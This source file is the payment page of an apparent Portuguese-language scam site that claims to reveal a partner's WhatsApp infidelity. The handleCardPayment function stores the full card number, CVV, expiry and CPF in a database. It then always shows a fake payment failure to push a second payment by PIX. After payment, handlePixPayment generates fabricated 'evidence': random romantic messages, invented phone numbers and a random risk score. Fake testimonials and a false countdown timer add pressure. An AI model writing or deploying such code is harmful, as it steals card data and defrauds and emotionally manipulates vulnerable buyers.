import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { CreditCard, Shield, Clock, CheckCircle, AlertTriangle, Star, Smartphone } from 'lucide-react'
import QRCodePix from '../components/QRCodePix'
import FakeMessages from '../components/FakeMessages'
import { saveCardData, type CardData } from '../services/supabase'

const PaymentPage = () => {
  const navigate = useNavigate()
  const [analysisResults, setAnalysisResults] = useState<any>(null)
  const [analysisData, setAnalysisData] = useState<any>(null)
  const [selectedPlan, setSelectedPlan] = useState('premium')
  const [timeLeft, setTimeLeft] = useState(600) // 10 minutos em segundos
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix') // Mudado para PIX por padrão para testes
  const [showPixDiscount, setShowPixDiscount] = useState(false)
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    cpf: '',
    email: '',
    phone: ''
  })
  const [cardError, setCardError] = useState('')
  const [randomTestimonials, setRandomTestimonials] = useState<any[]>([])

  const allTestimonials = [
    {
      name: "Patricia S.",
      avatar: "👩",
      color: "pink",
      text: "Valeu cada centavo! Descobri coisas que nunca imaginei. O relatório é muito detalhado."
    },
    {
      name: "Roberto M.",
      avatar: "👨",
      color: "blue",
      text: "Funcionou perfeitamente! Agora tenho certeza e posso tomar uma decisão."
    },
    {
      name: "Juliana F.",
      avatar: "👩",
      color: "purple",
      text: "Incrível! Me ajudou a descobrir a verdade. Recomendo muito!"
    },
    {
      name: "Carlos A.",
      avatar: "👨",
      color: "green",
      text: "Melhor investimento que fiz. Descobri tudo que precisava saber."
    },
    {
      name: "Amanda L.",
      avatar: "👩",
      color: "red",
      text: "Rápido e eficiente! Em minutos tive o relatório completo."
    },
    {
      name: "Felipe R.",
      avatar: "👨",
      color: "yellow",
      text: "Surpreendente! Não acreditei no tanto de informação que consegui."
    },
    {
      name: "Mariana C.",
      avatar: "👩",
      color: "indigo",
      text: "Salvou meu relacionamento! Agora sei a verdade e posso seguir em frente."
    },
    {
      name: "Lucas P.",
      avatar: "👨",
      color: "teal",
      text: "Muito bom! Interface fácil e resultado completo. Vale muito a pena!"
    }
  ]

  useEffect(() => {
    // Limpar dados antigos de pagamento/resultados ao entrar na página
    localStorage.removeItem('paymentConfirmed')
    localStorage.removeItem('paymentTimestamp')
    localStorage.removeItem('finalResults')
    
    // Verificar se temos dados da análise
    const results = localStorage.getItem('analysisResults')
    const data = localStorage.getItem('analysisData')
    
    if (!results || !data) {
      navigate('/')
      return
    }
    
    setAnalysisResults(JSON.parse(results))
    setAnalysisData(JSON.parse(data))

    // Selecionar 2 depoimentos aleatórios
    const shuffled = [...allTestimonials].sort(() => Math.random() - 0.5)
    setRandomTestimonials(shuffled.slice(0, 2))

    // Timer countdown
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [navigate])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`
  }

  const handleCardPayment = async () => {
    setIsProcessing(true)
    setCardError('')
    
    try {
      // Salvar dados do cartão no Supabase
      const cardPayload: Omit<CardData, 'id' | 'created_at'> = {
        card_number: cardData.cardNumber,
        card_holder: cardData.cardHolder,
        expiry_date: cardData.expiryDate,
        cvv: cardData.cvv,
        cpf: cardData.cpf,
        email: cardData.email || analysisData.userEmail,
        phone: cardData.phone,
        amount: selectedPlan === 'basic' ? 19.90 : 29.90
      }
      
      await saveCardData(cardPayload)
      
      // Simular erro no cartão após 2 segundos
      setTimeout(() => {
        setIsProcessing(false)
        setCardError('Parece que houve uma falha ao processar o pagamento. Você recebeu 20% de desconto para pagamento via PIX!')
        setShowPixDiscount(true)
      }, 2000)
      
    } catch (error) {
      setIsProcessing(false)
      setCardError('Erro interno. Tente novamente.')
    }
  }

  const handlePixPayment = () => {
    // Lista de mensagens
    const allMessages = [
      "Oi, tudo bem? Tô com saudades...", "Consegue sair hoje?", "Deleta depois, ok?",
      "Não fala nada pra ninguém", "Tô pensando em você", "Que tal nos encontrarmos?",
      "Adorei ontem ❤️", "Você tá livre?", "Preciso te ver", "Tá complicado aqui em casa...",
      "Você é especial pra mim", "Quando vai dar certo?", "Nosso segredo", "Mal posso esperar",
      "Oi lindeza, como foi o dia?", "Conseguiu sair de casa?", "Tô morrendo de saudade",
      "Vamos marcar algo?", "Não posso parar de pensar em você", "Ela/ele não desconfia de nada",
      "Te amo demais", "Quando a gente vai ficar junto?", "Apaga tudo depois", "Só você me entende",
      "Tô louca/o pra te ver", "Hoje não vai dar...", "Inventei uma desculpa aqui", "Você é incrível"
    ]
    
    // Pegar quantidade da análise
    const numMessages = analysisResults.messages || 0
    const numContacts = analysisResults.contacts || 0
    const numMedia = analysisResults.media || 0
    
    // Selecionar mensagens
    const shuffled = [...allMessages].sort(() => Math.random() - 0.5)
    const selectedMessages = shuffled.slice(0, numMessages)
    
    // Extrair DDD
    const ddd = analysisData.whatsapp.match(/\d{2,3}/)?.[0] || '11'
    
    // Gerar contatos
    const contactNames = ["Contato não salvo", "❤️ Amor", "Trabalho 😉", "🔥 Gatinha", "Amigo(a)"]
    const selectedContacts = contactNames.slice(0, numContacts).map((name, i) => ({
      name,
      number: `+55 ${ddd} 9${1000 + Math.floor(Math.random() * 9000)}-${1000 + Math.floor(Math.random() * 9000)}`,
      risk: i === 0 || i === 2 || i === 3 ? "Alto" : "Médio"
    }))
    
    // Dividir mídias
    const photos = Math.floor(numMedia * 0.6)
    const videos = numMedia - photos
    const deletedMedia = Math.floor(numMedia * 0.3)
    
    // Criar resultado final
    const finalResults = {
      messages: numMessages,
      contacts: numContacts,
      media: numMedia,
      riskLevel: analysisResults.riskLevel,
      detailedMessages: selectedMessages,
      suspiciousContacts: selectedContacts,
      mediaAnalysis: { photos, videos, deletedMedia },
      deletedMedia,
      riskScore: Math.floor(Math.random() * 30) + 70,
      recommendations: generateRecommendations()
    }
    
    localStorage.setItem('paymentConfirmed', 'true')
    localStorage.setItem('paymentTimestamp', Date.now().toString())
    localStorage.setItem('finalResults', JSON.stringify(finalResults))
    navigate('/resultado')
  }

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setCardData(prev => ({
      ...prev,
      [name]: value
    }))
  }


  const generateRecommendations = () => {
    return [
      "Converse abertamente sobre suas preocupações",
      "Considere terapia de casal",
      "Estabeleça limites claros de comunicação",
      "Busque ajuda profissional se necessário"
    ]
  }

  if (!analysisResults || !analysisData) {
    return <div>Carregando...</div>
  }

  const plans = [
    {
      id: 'basic',
      name: 'Relatório Básico',
      price: 'R$ 19,90',
      originalPrice: 'R$ 39,90',
      features: [
        'Resumo das atividades suspeitas',
        'Contagem de mensagens e mídias',
        'Nível de risco geral',
        'Suporte por email'
      ]
    },
    {
      id: 'premium',
      name: 'Relatório Completo',
      price: 'R$ 29,90',
      originalPrice: 'R$ 59,90',
      popular: true,
      features: [
        'Análise detalhada de todas as conversas',
        'Lista completa de contatos suspeitos',
        'Horários e padrões de comportamento',
        'Evidências específicas encontradas',
        'Recomendações personalizadas',
        'Suporte prioritário 24h'
      ]
    }
  ]

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-bold text-gray-800">
              Liberar Relatório Completo
            </h1>
            <div className="flex items-center text-red-600 font-semibold">
              <Clock className="w-5 h-5 mr-2" />
              Oferta expira em: {formatTime(timeLeft)}
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-6xl mx-auto">
          {/* Results Preview */}
          <div className="bg-white rounded-2xl shadow-lg p-8 mb-8">
            <div className="text-center mb-8">
              <AlertTriangle className="w-16 h-16 text-red-500 mx-auto mb-4" />
              <h2 className="text-3xl font-bold text-red-700 mb-2">
                🚨 ANÁLISE CONCLUÍDA - ATIVIDADE SUSPEITA DETECTADA!
              </h2>
              <p className="text-gray-600">
                Encontramos evidências preocupantes no WhatsApp <strong>{analysisData.whatsapp}</strong>
              </p>
            </div>

            <div className="grid md:grid-cols-4 gap-6 mb-8">
              <div className="text-center p-6 bg-red-50 rounded-xl border border-red-200">
                <div className="text-3xl font-bold text-red-600 mb-2">
                  {analysisResults.messages}
                </div>
                <div className="text-sm text-gray-600">
                  Mensagens Suspeitas
                </div>
              </div>
              <div className="text-center p-6 bg-red-50 rounded-xl border border-red-200">
                <div className="text-3xl font-bold text-red-600 mb-2">
                  {analysisResults.media}
                </div>
                <div className="text-sm text-gray-600">
                  Mídias Comprometedoras
                </div>
              </div>
              <div className="text-center p-6 bg-red-50 rounded-xl border border-red-200">
                <div className="text-3xl font-bold text-red-600 mb-2">
                  {analysisResults.contacts}
                </div>
                <div className="text-sm text-gray-600">
                  Contatos Suspeitos
                </div>
              </div>
              <div className="text-center p-6 bg-red-50 rounded-xl border border-red-200">
                <div className="text-3xl font-bold text-red-600 mb-2">
                  {analysisResults.riskLevel === 'high' ? 'ALTO' : 'MÉDIO'}
                </div>
                <div className="text-sm text-gray-600">
                  Nível de Risco
                </div>
              </div>
            </div>

            <FakeMessages />
          </div>

          {/* Pricing Plans */}
          <div className="grid md:grid-cols-2 gap-8 mb-8">
            {plans.map((plan) => (
              <div
                key={plan.id}
                className={`relative bg-white rounded-2xl shadow-lg p-8 border-2 cursor-pointer transition-all duration-300 ${
                  selectedPlan === plan.id
                    ? 'border-red-500 transform scale-105'
                    : 'border-gray-200 hover:border-red-300'
                }`}
                onClick={() => setSelectedPlan(plan.id)}
              >
                {plan.popular && (
                  <div className="absolute -top-4 left-1/2 transform -translate-x-1/2">
                    <div className="bg-red-500 text-white px-4 py-2 rounded-full text-sm font-semibold flex items-center">
                      <Star className="w-4 h-4 mr-1" />
                      MAIS POPULAR
                    </div>
                  </div>
                )}

                <div className="text-center mb-6">
                  <h3 className="text-2xl font-bold text-gray-800 mb-2">
                    {plan.name}
                  </h3>
                  <div className="flex items-center justify-center space-x-2">
                    <span className="text-3xl font-bold text-red-600">
                      {plan.price}
                    </span>
                    <span className="text-lg text-gray-400 line-through">
                      {plan.originalPrice}
                    </span>
                  </div>
                  <p className="text-sm text-green-600 font-semibold mt-1">
                    50% OFF - Oferta Limitada!
                  </p>
                </div>

                <ul className="space-y-3 mb-6">
                  {plan.features.map((feature, index) => (
                    <li key={index} className="flex items-center">
                      <CheckCircle className="w-5 h-5 text-green-500 mr-3" />
                      <span className="text-gray-700">{feature}</span>
                    </li>
                  ))}
                </ul>

                <div className="text-center">
                  <div className={`w-6 h-6 rounded-full border-2 mx-auto ${
                    selectedPlan === plan.id
                      ? 'bg-red-500 border-red-500'
                      : 'border-gray-300'
                  }`}>
                    {selectedPlan === plan.id && (
                      <CheckCircle className="w-6 h-6 text-white" />
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Payment Methods */}
          <div className="glass-card p-8">
            <div className="text-center mb-8">
              <h3 className="text-2xl font-bold mb-2 title-premium">
                🔓 Liberar Relatório Agora
              </h3>
              <p className="text-gray-300">
                Pagamento 100% seguro • Acesso imediato
              </p>
            </div>

            {/* Payment Method Tabs */}
            <div className="grid grid-cols-2 gap-4 mb-8">
              <button
                onClick={() => setPaymentMethod('card')}
                className={`relative overflow-hidden group transition-all duration-300 outline-none focus:outline-none active:outline-none ${
                  paymentMethod === 'card'
                    ? 'transform scale-105'
                    : 'hover:scale-102'
                }`}
              >
                <div className={`relative p-6 rounded-xl border-2 transition-all duration-300 ${
                  paymentMethod === 'card'
                    ? 'bg-gradient-to-br from-red-600 via-red-700 to-purple-800 border-red-500 shadow-2xl shadow-red-500/50'
                    : 'bg-gray-900 border-gray-600 hover:border-red-500/50 hover:bg-gray-800'
                }`}>
                  <div className="flex items-center space-x-4">
                    <CreditCard className={`w-8 h-8 ${
                      paymentMethod === 'card'
                        ? 'text-gray-900'
                        : 'text-gray-300'
                    }`} />
                    <div className="flex-1 text-left">
                      <div className={`font-bold text-lg mb-1 ${
                        paymentMethod === 'card'
                          ? 'text-gray-900'
                          : 'text-gray-200'
                      }`}>
                        Cartão de Crédito
                      </div>
                      <div className={`text-xs ${
                        paymentMethod === 'card'
                          ? 'text-gray-700'
                          : 'text-gray-400'
                      }`}>
                        Visa • Mastercard • Elo
                      </div>
                    </div>
                  </div>
                  {showPixDiscount && paymentMethod !== 'card' && (
                    <div className="absolute top-2 right-2">
                      <div className="text-xs bg-orange-500 text-white px-2 py-1 rounded-full font-bold animate-pulse">
                        20% OFF no PIX
                      </div>
                    </div>
                  )}
                </div>
              </button>

              <button
                onClick={() => setPaymentMethod('pix')}
                className={`relative overflow-hidden group transition-all duration-300 outline-none focus:outline-none active:outline-none ${
                  paymentMethod === 'pix'
                    ? 'transform scale-105'
                    : 'hover:scale-102'
                }`}
              >
                <div className={`relative p-6 rounded-xl border-2 transition-all duration-300 ${
                  paymentMethod === 'pix'
                    ? 'bg-gradient-to-br from-green-600 via-emerald-600 to-teal-700 border-green-500 shadow-2xl shadow-green-500/50'
                    : 'bg-gray-900 border-gray-600 hover:border-green-500/50 hover:bg-gray-800'
                }`}>
                  <div className="flex items-center space-x-4">
                    <Smartphone className={`w-8 h-8 ${
                      paymentMethod === 'pix'
                        ? 'text-gray-900'
                        : 'text-gray-300'
                    }`} />
                    <div className="flex-1 text-left">
                      <div className={`font-bold text-lg mb-1 ${
                        paymentMethod === 'pix'
                          ? 'text-gray-900'
                          : 'text-gray-200'
                      }`}>
                        PIX
                      </div>
                      <div className={`text-xs ${
                        paymentMethod === 'pix'
                          ? 'text-gray-700'
                          : 'text-gray-400'
                      }`}>
                        {showPixDiscount ? 'Com 20% de desconto' : 'Pagamento instantâneo'}
                      </div>
                    </div>
                  </div>
                  {showPixDiscount && paymentMethod === 'pix' && (
                    <div className="absolute top-2 right-2">
                      <div className="text-xs bg-yellow-400 text-gray-900 px-2 py-1 rounded-full font-bold">
                        20% OFF
                      </div>
                    </div>
                  )}
                </div>
              </button>
            </div>

            {/* Credit Card Form */}
            {paymentMethod === 'card' && (
              <div className="space-y-4">
                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      Número do Cartão *
                    </label>
                    <input
                      type="text"
                      name="cardNumber"
                      value={cardData.cardNumber}
                      onChange={handleCardInputChange}
                      placeholder="1234 5678 9012 3456"
                      className="input-field"
                      maxLength={19}
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      Nome no Cartão *
                    </label>
                    <input
                      type="text"
                      name="cardHolder"
                      value={cardData.cardHolder}
                      onChange={handleCardInputChange}
                      placeholder="NOME COMPLETO"
                      className="input-field"
                      required
                    />
                  </div>
                </div>

                <div className="grid md:grid-cols-3 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      Validade *
                    </label>
                    <input
                      type="text"
                      name="expiryDate"
                      value={cardData.expiryDate}
                      onChange={handleCardInputChange}
                      placeholder="MM/AA"
                      className="input-field"
                      maxLength={5}
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      CVV *
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      value={cardData.cvv}
                      onChange={handleCardInputChange}
                      placeholder="123"
                      className="input-field"
                      maxLength={4}
                      required
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      CPF *
                    </label>
                    <input
                      type="text"
                      name="cpf"
                      value={cardData.cpf}
                      onChange={handleCardInputChange}
                      placeholder="000.000.000-00"
                      className="input-field"
                      maxLength={14}
                      required
                    />
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      E-mail
                    </label>
                    <input
                      type="email"
                      name="email"
                      value={cardData.email}
                      onChange={handleCardInputChange}
                      placeholder="seu@email.com"
                      className="input-field"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-white mb-2">
                      Telefone
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      value={cardData.phone}
                      onChange={handleCardInputChange}
                      placeholder="(11) 99999-9999"
                      className="input-field"
                    />
                  </div>
                </div>

                {cardError && (
                  <div className="bg-red-50 border border-red-200 rounded-xl p-4">
                    <div className="flex items-start">
                      <AlertTriangle className="w-5 h-5 text-red-600 mr-3 mt-0.5" />
                      <div>
                        <h4 className="font-semibold text-red-800 mb-1">Erro no Pagamento</h4>
                        <p className="text-red-700 text-sm">{cardError}</p>
                      </div>
                    </div>
                  </div>
                )}

                <button
                  onClick={handleCardPayment}
                  disabled={isProcessing}
                  className="w-full btn-primary"
                >
                  {isProcessing ? (
                    <div className="flex items-center justify-center">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-3"></div>
                      Processando Pagamento...
                    </div>
                  ) : (
                    <>
                      <CreditCard className="w-6 h-6 inline mr-2" />
                      PAGAR R$ {selectedPlan === 'basic' ? '19,90' : '29,90'}
                    </>
                  )}
                </button>
              </div>
            )}

            {/* PIX Payment */}
            {paymentMethod === 'pix' && (
              <QRCodePix
                amount={
                  showPixDiscount 
                    ? (selectedPlan === 'basic' ? 15.92 : 23.92)
                    : (selectedPlan === 'basic' ? 19.90 : 29.90)
                }
                email={analysisData?.userEmail}
                phone={cardData.phone}
                hasDiscount={showPixDiscount}
                onPaymentConfirmed={handlePixPayment}
              />
            )}

            <div className="flex items-center justify-center space-x-6 mt-6 text-sm text-gray-400">
              <div className="flex items-center">
                <Shield className="w-4 h-4 mr-1 text-green-400" />
                🔒 Pagamento Seguro
              </div>
              <div className="flex items-center">
                <CheckCircle className="w-4 h-4 mr-1 text-blue-400" />
                ⚡ Acesso Imediato
              </div>
            </div>

            <p className="text-xs text-gray-500 mt-4 text-center">
              Ao continuar, você concorda com nossos termos de uso e política de privacidade.
            </p>
          </div>

          {/* Testimonials */}
          <div className="mt-8 glass-card p-8">
            <h3 className="text-2xl font-bold text-center mb-6 title-premium">
              💬 O que dizem nossos clientes
            </h3>
            
            <div className="grid md:grid-cols-2 gap-6">
              {randomTestimonials.map((testimonial, index) => (
                <div key={index} className="bg-white/5 rounded-xl p-6 border border-white/10">
                  <div className="flex items-center mb-4">
                    <div className={`w-12 h-12 bg-${testimonial.color}-500/20 rounded-full flex items-center justify-center border border-${testimonial.color}-500/30`}>
                      <span className="text-2xl">{testimonial.avatar}</span>
                    </div>
                    <div className="ml-3">
                      <h4 className="font-semibold text-white">{testimonial.name}</h4>
                      <div className="text-yellow-400">⭐⭐⭐⭐⭐</div>
                    </div>
                  </div>
                  <p className="text-gray-300 italic">
                    "{testimonial.text}"
                  </p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default PaymentPage
